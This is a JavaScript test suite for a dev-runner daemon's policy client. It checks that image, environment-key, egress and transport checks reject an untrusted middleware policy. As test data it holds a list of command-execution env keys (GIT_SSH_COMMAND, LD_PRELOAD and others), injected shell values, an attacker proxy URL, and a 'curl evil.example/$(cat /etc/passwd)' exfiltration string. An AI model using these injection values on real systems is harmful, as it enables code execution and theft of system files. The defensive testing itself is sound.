/**
 * Epic #470 W1 — job-policy client clamp + transport-safety tests (round-3
 * findings). These prove the daemon treats the middleware's policy response as
 * UNTRUSTED input:
 *   - image repository must be allowlisted; a floating tag is refused when a
 *     digest is required; an env key that is not on the allowlist is refused — and
 *     in every rejection NO policy is returned (so no container can be created);
 *   - the policy fetch refuses a 30x redirect (the endpoint is pinned);
 *   - the body read is bounded (oversized body) and timed (slow body).
 *
 * The redirect / body-bound tests drive the REAL global fetch against a REAL
 * http server, because those behaviours live in fetch options + the stream read,
 * not in a hand-built fake.
 */

import { strict as assert } from 'node:assert';
import { createServer } from 'node:http';
import { afterEach, describe, it } from 'node:test';

import {
  createPolicyClient,
  parseAllowedImages,
  parseEgressProxyUrl,
  parseImageReference,
  parseRequireDigest,
  PolicyConfigError,
  PolicyLookupError,
} from '../src/policyClient.mjs';

const REPO = 'ghcr.io/byte5ai/omadia-dev-runner';
const DIGEST = `sha256:${'a'.repeat(64)}`;
const JOB_ID = '11111111-1111-4111-8111-111111111111';

/** A policy body as the middleware endpoint returns it. */
function policyBody(overrides = {}) {
  return {
    jobId: JOB_ID,
    image: `${REPO}@${DIGEST}`,
    env: { ANTHROPIC_BASE_URL: 'http://middleware:8080/api/v1/dev-runner/llm' },
    egressAllowlist: ['github.com'],
    ...overrides,
  };
}

/** A fetch fake returning one JSON Response. */
function fakeFetch(body, { status = 200 } = {}) {
  return async () => new Response(typeof body === 'string' ? body : JSON.stringify(body), { status });
}

/** Build a client with a fake fetch and the standard allowlist. */
function clientWith(body, opts = {}) {
  return createPolicyClient({
    middlewareUrl: 'http://middleware:8080',
    daemonToken: 'x'.repeat(40),
    allowedImages: opts.allowedImages ?? [REPO],
    requireDigest: opts.requireDigest,
    fetchImpl: fakeFetch(body, opts),
    ...opts.clientOpts,
  });
}

/** Assert a fetchJobPolicy call rejects with a PolicyLookupError of `code`. */
async function rejectsWithCode(promise, code) {
  await assert.rejects(promise, (err) => {
    assert.ok(err instanceof PolicyLookupError, `expected PolicyLookupError, got ${err}`);
    assert.equal(err.code, code);
    return true;
  });
}

// ---------------------------------------------------------------------------

describe('policyClient — DEV_RUNNER_ALLOWED_IMAGES parsing', () => {
  it('refuses an unset / empty allowlist so the daemon cannot start without one', () => {
    assert.throws(() => parseAllowedImages(undefined), PolicyConfigError);
    assert.throws(() => parseAllowedImages(''), PolicyConfigError);
    assert.throws(() => parseAllowedImages('   '), PolicyConfigError);
    assert.throws(() => parseAllowedImages(',, ,'), PolicyConfigError);
  });

  it('parses a comma-separated list of bare repositories', () => {
    assert.deepEqual(parseAllowedImages(REPO), [REPO]);
    assert.deepEqual(parseAllowedImages(`${REPO}, ghcr.io/byte5ai/other ,`), [REPO, 'ghcr.io/byte5ai/other']);
  });

  it('rejects an allowlist entry that carries a tag or digest', () => {
    assert.throws(() => parseAllowedImages(`${REPO}:latest`), PolicyConfigError);
    assert.throws(() => parseAllowedImages(`${REPO}@${DIGEST}`), PolicyConfigError);
  });
});

describe('policyClient — DEV_RUNNER_REQUIRE_DIGEST parsing', () => {
  it('defaults ON', () => {
    assert.equal(parseRequireDigest(undefined), true);
    assert.equal(parseRequireDigest(''), true);
    assert.equal(parseRequireDigest('true'), true);
    assert.equal(parseRequireDigest('1'), true);
  });
  it('is OFF only for an explicit falsey value', () => {
    for (const v of ['false', '0', 'no', 'off', 'FALSE', 'Off']) {
      assert.equal(parseRequireDigest(v), false, `${v} should disable`);
    }
  });
});

describe('policyClient — parseImageReference', () => {
  it('splits registry/repo/tag/digest without confusing a registry port for a tag', () => {
    assert.deepEqual(parseImageReference(`${REPO}@${DIGEST}`), { repository: REPO, tag: undefined, digest: DIGEST });
    assert.deepEqual(parseImageReference(`${REPO}:latest`), { repository: REPO, tag: 'latest', digest: undefined });
    assert.deepEqual(parseImageReference('ghcr.io:5000/foo/bar:1.2'), {
      repository: 'ghcr.io:5000/foo/bar',
      tag: '1.2',
      digest: undefined,
    });
    assert.deepEqual(parseImageReference('ubuntu'), { repository: 'ubuntu', tag: undefined, digest: undefined });
  });
});

describe('policyClient — construction guard', () => {
  it('refuses to build without an allowlist (the clamp is not optional)', () => {
    assert.throws(
      () => createPolicyClient({ middlewareUrl: 'http://mw', daemonToken: 'x'.repeat(40), allowedImages: [] }),
      PolicyConfigError,
    );
  });
});

describe('policyClient — image clamp on the untrusted policy', () => {
  it('accepts an allowlisted, digest-pinned image', async () => {
    const client = clientWith(policyBody());
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.image, `${REPO}@${DIGEST}`);
  });

  it('refuses an image whose repository is NOT allowlisted, and returns no policy', async () => {
    const client = clientWith(policyBody({ image: `ghcr.io/evil/runner@${DIGEST}` }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.image_not_allowed');
  });

  it('refuses a floating tag when a digest is required', async () => {
    const client = clientWith(policyBody({ image: `${REPO}:latest` }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.image_requires_digest');
  });

  it('refuses a malformed digest', async () => {
    const client = clientWith(policyBody({ image: `${REPO}@sha256:abc` }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.image_bad_digest');
  });

  it('allows a floating tag ONLY when digest-pinning is explicitly disabled', async () => {
    const client = clientWith(policyBody({ image: `${REPO}:latest` }), { requireDigest: false });
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.image, `${REPO}:latest`);
  });
});

describe('policyClient — env clamp on the untrusted policy (allowlist)', () => {
  // The command-execution class the allowlist exists to refuse: a compromised
  // middleware ships one of these and gets arbitrary exec on the next git/shell/
  // loader invocation. A denylist cannot enumerate this moving target; the
  // allowlist refuses every one because none is on it. Plus the old denylist
  // members, to prove the allowlist is a strict superset of the prior guard.
  const DANGEROUS_KEYS = [
    // Not merely 'unused': HOME hands the attacker ~/.gitconfig (core.pager,
    // core.sshCommand, alias.* all execute) and CLAUDE_CONFIG_DIR hands them
    // Claude Code hooks. The image fixes both to job-scoped paths.
    'HOME',
    'CLAUDE_CONFIG_DIR',
    'GIT_SSH_COMMAND',
    'GIT_EXTERNAL_DIFF',
    'GIT_PROXY_COMMAND',
    'GIT_SSH',
    'BASH_ENV',
    'ENV',
    'LD_PRELOAD',
    'LD_LIBRARY_PATH',
    'LD_AUDIT',
    'NODE_OPTIONS',
    'PATH',
    'DEV_RUNNER_DAEMON_TOKEN',
    'DOCKER_HOST',
    'DOCKER_TLS_VERIFY',
    'PERL5LIB',
    'PYTHONSTARTUP',
    'IFS',
  ];
  // Non-daemon-owned dangerous keys (proxy vars are daemon-owned — a separate
  // rejection code — so they are tested in the daemon-owned block below).
  for (const key of DANGEROUS_KEYS) {
    it(`refuses a policy env carrying the un-allowlisted key ${key}`, async () => {
      const client = clientWith(policyBody({ env: { [key]: 'sh -c id' } }));
      await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_not_allowed');
    });
  }

  // Every key on the allowlist must pass, individually. The daemon-owned keys
  // (OMADIA_JOB_BASE_URL/JOB_ID/WORKSPACE/CLI_BIN) are NOT here — they are
  // injected, never accepted; their own describe block below covers that.
  const ALLOWED_KEYS = [
    'OMADIA_JOB_TOKEN',
    'OMADIA_LLM_ENV_ALLOWED',
    'OMADIA_ANTHROPIC_BASE_URL',
    'OMADIA_ANTHROPIC_AUTH_TOKEN',
    'ANTHROPIC_BASE_URL',
    'ANTHROPIC_AUTH_TOKEN',
    'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC',
    'DISABLE_AUTOUPDATER',
    'DISABLE_TELEMETRY',
    'LANG',
    'LC_ALL',
    'TERM',
  ];
  const INJECTED_KEYS = ['OMADIA_JOB_BASE_URL', 'OMADIA_JOB_ID', 'OMADIA_WORKSPACE', 'OMADIA_CLI_BIN'];

  for (const key of ALLOWED_KEYS) {
    it(`accepts the allowlisted key ${key} (kept alongside the injected daemon-owned keys)`, async () => {
      const client = clientWith(policyBody({ env: { [key]: 'value' } }));
      const policy = await client.fetchJobPolicy(JOB_ID);
      assert.equal(policy.env[key], 'value');
      // the returned env is the allowlisted policy env PLUS the daemon-owned keys.
      assert.deepEqual(Object.keys(policy.env).sort(), [key, ...INJECTED_KEYS].sort());
    });
  }

  it('accepts a policy env of several allowlisted keys together', async () => {
    const client = clientWith(policyBody({ env: { ANTHROPIC_BASE_URL: 'http://mw/llm', DISABLE_TELEMETRY: '1' } }));
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.env.ANTHROPIC_BASE_URL, 'http://mw/llm');
    assert.equal(policy.env.DISABLE_TELEMETRY, '1');
  });

  it('rejects the un-allowlisted key even when mixed with allowlisted keys', async () => {
    const client = clientWith(policyBody({ env: { ANTHROPIC_BASE_URL: 'http://mw/llm', GIT_SSH_COMMAND: 'sh -c pwned' } }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_not_allowed');
  });

  it('names the offending key but NEVER its value in the rejection', async () => {
    const secretValue = 'sh -c curl evil.example/$(cat /etc/passwd)';
    const client = clientWith(policyBody({ env: { GIT_SSH_COMMAND: secretValue } }));
    await assert.rejects(client.fetchJobPolicy(JOB_ID), (err) => {
      assert.ok(err instanceof PolicyLookupError);
      assert.equal(err.code, 'daemon.env_key_not_allowed');
      assert.ok(err.message.includes('GIT_SSH_COMMAND'), 'error should name the key');
      assert.ok(!err.message.includes(secretValue), 'error must NOT echo the value');
      assert.ok(!err.message.includes('evil.example'), 'error must NOT leak any part of the value');
      return true;
    });
  });
});

describe('policyClient — daemon-owned env keys are injected, never accepted', () => {
  const DAEMON_OWNED = [
    'OMADIA_JOB_BASE_URL',
    'OMADIA_JOB_ID',
    'OMADIA_WORKSPACE',
    'OMADIA_CLI_BIN',
    // Egress-routing lever — daemon-owned (both spellings). A policy value would
    // redirect every http(s) client in the container (git included) through an
    // attacker proxy, so the policy must never supply it.
    'HTTP_PROXY',
    'HTTPS_PROXY',
    'NO_PROXY',
    'http_proxy',
    'https_proxy',
    'no_proxy',
  ];

  // A policy that carries any of these is a compromised/spoofed middleware trying
  // to steer the CLI binary, redirect phone-home, or route egress through an
  // attacker proxy; it is refused LOUDLY (its own code), never silently overwritten.
  for (const key of DAEMON_OWNED) {
    it(`REJECTS a policy that supplies the daemon-owned key ${key}`, async () => {
      const hostile = key === 'OMADIA_CLI_BIN' ? './pwn' : 'http://attacker.example:3128';
      const client = clientWith(policyBody({ env: { [key]: hostile } }));
      await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_reserved');
    });
  }

  it('rejects a daemon-owned key even mixed with allowlisted keys, and returns no policy', async () => {
    const client = clientWith(policyBody({ env: { ANTHROPIC_BASE_URL: 'http://mw/llm', OMADIA_CLI_BIN: './pwn' } }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.env_key_reserved');
  });

  it('injects the daemon defaults (job id, own base URL, /workspace, claude)', async () => {
    const client = clientWith(policyBody());
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.env.OMADIA_JOB_ID, JOB_ID);
    assert.equal(policy.env.OMADIA_JOB_BASE_URL, 'http://middleware:8080');
    assert.equal(policy.env.OMADIA_WORKSPACE, '/workspace');
    assert.equal(policy.env.OMADIA_CLI_BIN, 'claude');
  });

  it('injects the daemon-configured overrides for base URL, workspace and CLI', async () => {
    const client = clientWith(policyBody(), {
      clientOpts: { jobBaseUrl: 'https://mw.internal/', workspacePath: '/srv/job', cliBin: '/usr/local/bin/claude' },
    });
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.env.OMADIA_JOB_BASE_URL, 'https://mw.internal'); // trailing slash stripped
    assert.equal(policy.env.OMADIA_WORKSPACE, '/srv/job');
    assert.equal(policy.env.OMADIA_CLI_BIN, '/usr/local/bin/claude');
  });

  it('injects proxy vars (both spellings) ONLY when the daemon has one configured', async () => {
    const client = clientWith(policyBody(), {
      clientOpts: { egressProxyUrl: 'http://egress-proxy:3128', noProxy: 'middleware,localhost' },
    });
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.env.HTTP_PROXY, 'http://egress-proxy:3128');
    assert.equal(policy.env.HTTPS_PROXY, 'http://egress-proxy:3128');
    assert.equal(policy.env.http_proxy, 'http://egress-proxy:3128');
    assert.equal(policy.env.https_proxy, 'http://egress-proxy:3128');
    assert.equal(policy.env.NO_PROXY, 'middleware,localhost');
    assert.equal(policy.env.no_proxy, 'middleware,localhost');
  });

  it('splices the per-job proxy credentials into the injected proxy URL', async () => {
    // The proxy is default-deny and authenticates as Basic base64(jobId:proxyToken).
    // Standard http clients derive that header from the URL userinfo, so the
    // credential has to travel there — in the INJECTED value, never in the
    // operator-supplied DEV_RUNNER_EGRESS_PROXY_URL (which still refuses userinfo).
    const token = 'a'.repeat(64);
    const client = clientWith(policyBody(), {
      clientOpts: { egressProxyUrl: 'http://egress-proxy:3128' },
    });
    const policy = await client.fetchJobPolicy(JOB_ID, { proxyToken: token });
    const expected = `http://${JOB_ID}:${token}@egress-proxy:3128/`;
    for (const k of ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']) {
      assert.equal(policy.env[k], expected, `${k} must carry the job's own credential`);
    }
  });

  it('still refuses an operator proxy URL that carries userinfo', async () => {
    assert.throws(
      () => clientWith(policyBody(), { clientOpts: { egressProxyUrl: 'http://u:p@egress-proxy:3128' } }),
      /must not carry userinfo/,
    );
  });

  it('injects NO proxy vars when the daemon has none configured', async () => {
    const client = clientWith(policyBody());
    const policy = await client.fetchJobPolicy(JOB_ID);
    for (const k of ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy', 'NO_PROXY', 'no_proxy']) {
      assert.equal(policy.env[k], undefined, `${k} must be absent without a configured proxy`);
    }
  });
});

describe('policyClient — response jobId is pinned to the request (review low finding)', () => {
  it('REJECTS a response whose jobId does not equal the requested one', async () => {
    // A policy for a DIFFERENT job is a confused or hostile middleware; refuse it
    // outright rather than trust it anywhere (the daemon-pinned OMADIA_JOB_ID is
    // defence-in-depth, not a licence to accept a mismatched policy).
    const client = clientWith(policyBody({ jobId: '99999999-9999-4999-8999-999999999999' }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_job_mismatch');
  });

  it('refuses a non-UUID jobId at the schema (never reaches the equality check)', async () => {
    const client = clientWith(policyBody({ jobId: 'not-a-uuid' }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_malformed');
  });

  it('accepts a response whose jobId equals the requested one', async () => {
    const client = clientWith(policyBody());
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.env.OMADIA_JOB_ID, JOB_ID);
  });
});

describe('policyClient — DEV_RUNNER_EGRESS_PROXY_URL parsing', () => {
  it('treats unset/empty as no proxy', () => {
    assert.equal(parseEgressProxyUrl(undefined), undefined);
    assert.equal(parseEgressProxyUrl(''), undefined);
    assert.equal(parseEgressProxyUrl('   '), undefined);
  });
  it('accepts an http(s) origin', () => {
    assert.equal(parseEgressProxyUrl('http://egress-proxy:3128'), 'http://egress-proxy:3128');
    assert.equal(parseEgressProxyUrl('https://egress-proxy:3128'), 'https://egress-proxy:3128');
  });
  it('rejects a set-but-invalid value (a typo must not silently disable the proxy)', () => {
    assert.throws(() => parseEgressProxyUrl('not a url'), PolicyConfigError);
    assert.throws(() => parseEgressProxyUrl('ftp://proxy:21'), PolicyConfigError);
    assert.throws(() => parseEgressProxyUrl('http://user:pass@proxy:3128'), PolicyConfigError);
  });
});

describe('policyClient — egress allowlist clamp on the untrusted policy', () => {
  it('accepts a bare-hostname allowlist', async () => {
    const client = clientWith(policyBody({ egressAllowlist: ['github.com', 'registry.npmjs.org', 'foo.internal'] }));
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.deepEqual(policy.egressAllowlist, ['github.com', 'registry.npmjs.org', 'foo.internal']);
  });

  // Each of these must reject the WHOLE policy (not silently drop the bad entry).
  const BAD_ENTRIES = [
    ['a scheme', 'https://github.com'],
    ['a path/userinfo', 'github.com/evil'],
    ['a userinfo confusion', 'github.com@169.254.169.254'],
    ['a port', 'github.com:8080'],
    ['a wildcard', '*.evil.example'],
    ['an IPv4 literal (public)', '8.8.8.8'],
    ['an IPv4 literal (metadata)', '169.254.169.254'],
    ['an IPv4 literal (RFC1918)', '10.0.0.1'],
    ['an IPv4-mapped IPv6 literal', '[::ffff:127.0.0.1]'],
    ['a control char', 'git\thub.com'],
    ['an empty entry', ''],
  ];
  for (const [why, entry] of BAD_ENTRIES) {
    it(`rejects the whole policy when an egress entry has ${why}`, async () => {
      const client = clientWith(policyBody({ egressAllowlist: ['github.com', entry] }));
      await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.egress_not_allowed');
    });
  }

  it('caps the number of egress entries', async () => {
    const many = Array.from({ length: 300 }, (_, i) => `h${i}.example`);
    const client = clientWith(policyBody({ egressAllowlist: many }));
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.egress_too_many');
  });
});

describe('policyClient — malformed upstream still refused', () => {
  it('refuses a schema-invalid body', async () => {
    const client = clientWith({ jobId: JOB_ID, image: 123 });
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_malformed');
  });
});

// --- transport safety: real fetch against a real server --------------------

describe('policyClient — transport safety (real fetch/server)', () => {
  /** @type {import('node:http').Server | undefined} */
  let server;
  afterEach(async () => {
    if (server) {
      server.closeAllConnections?.();
      await new Promise((resolve) => server.close(() => resolve(undefined)));
      server = undefined;
    }
  });

  /** Start a real server with a request handler; returns its base URL. */
  async function start(handler) {
    server = createServer(handler);
    await new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(undefined)));
    const addr = server.address();
    return `http://127.0.0.1:${addr.port}`;
  }

  it('refuses to follow a 30x redirect (the endpoint is pinned)', async () => {
    let followed = false;
    const base = await start((req, res) => {
      if (req.url?.includes('/job-policy/')) {
        res.writeHead(302, { location: '/target' });
        res.end();
        return;
      }
      followed = true; // only reached if the client followed the redirect
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify(policyBody()));
    });
    const client = createPolicyClient({ middlewareUrl: base, daemonToken: 'x'.repeat(40), allowedImages: [REPO] });
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_unreachable');
    assert.equal(followed, false, 'the client must NOT have followed the redirect off the pinned endpoint');
  });

  it('fails fast on an oversized body (byte cap), returning no policy', async () => {
    const base = await start((req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end('x'.repeat(64 * 1024)); // far past the tiny cap below
    });
    const client = createPolicyClient({
      middlewareUrl: base,
      daemonToken: 'x'.repeat(40),
      allowedImages: [REPO],
      maxBodyBytes: 512,
    });
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_too_large');
  });

  it('fails fast on a slow body that never completes (the abort spans the body read)', async () => {
    const base = await start((req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.write('{'); // one byte, then hang forever
    });
    const client = createPolicyClient({
      middlewareUrl: base,
      daemonToken: 'x'.repeat(40),
      allowedImages: [REPO],
      timeoutMs: 100,
    });
    const started = Date.now();
    await rejectsWithCode(client.fetchJobPolicy(JOB_ID), 'daemon.policy_unreachable');
    assert.ok(Date.now() - started < 5_000, 'must fail fast, not hang on the dribbled body');
  });

  it('reads a normal body under the cap and clamps its policy', async () => {
    const base = await start((req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify(policyBody()));
    });
    const client = createPolicyClient({ middlewareUrl: base, daemonToken: 'x'.repeat(40), allowedImages: [REPO] });
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.equal(policy.image, `${REPO}@${DIGEST}`);
  });
});

describe('policyClient — the CANONICAL egress hosts reach the engine', () => {
  it('replaces the policy allowlist with the classified hosts, not the raw spellings', async () => {
    // `GitHub.com.` and `[registry.npmjs.org]` both PASS classification, but the
    // engine (and the egress proxy reading this list) must see the host that was
    // actually judged — validating one spelling and forwarding another is the
    // bug class this epic keeps rediscovering.
    const client = clientWith(policyBody({ egressAllowlist: ['GitHub.com.', 'registry.npmjs.org'] }));
    const policy = await client.fetchJobPolicy(JOB_ID);
    assert.deepEqual(policy.egressAllowlist, ['github.com', 'registry.npmjs.org']);
  });
});
